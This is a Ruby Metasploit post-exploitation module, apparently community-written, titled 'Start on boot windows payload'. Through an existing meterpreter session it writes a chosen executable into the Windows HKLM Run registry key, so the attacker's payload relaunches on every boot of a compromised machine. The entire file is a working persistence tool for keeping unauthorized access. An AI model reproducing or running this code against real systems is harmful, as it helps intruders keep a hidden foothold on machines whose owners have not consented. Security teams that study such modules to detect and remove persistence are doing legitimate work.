##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
## Module by themrzmaster (github.com/themrzmaster)

require 'msf/core'
require 'rex'
require 'msf/core/auxiliary/report'

class Metasploit3 < Msf::Post
   
  include Msf::Post::Windows::Registry

  def initialize(info={})
    super(update_info(info,
      'Name'                 => "Start on boot windows payload",
      'Description'          => %q{
        This module will attempt to add your payload to start on every system boot.
        That way every time the machine is turned on your payload will be automatically started.
        You must have admin privileges on target machine to execute this.
      },
      'License'              => MSF_LICENSE,
      'Platform'             => ['win'],
      'SessionTypes'         => ['meterpreter'],
      'Author'               => ['themrzmaster']
    ))

    register_options(
      [
        OptString.new('EXEPath', [true, 'Path to the executable that will be added']),
      ], self.class)
  end

  def run
    path = datastore['EXEPath']
    key = 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'
    valname = path.split('/')[-1].split('.')[0]
    
   
    print_status("Trying to add #{path} to windows registries")
      
    setdata = registry_setvaldata(key, valname, path, 'REG_SZ')
   
    fstatus = registry_getvaldata(key,valname)
    
    print fstatus

  end

end
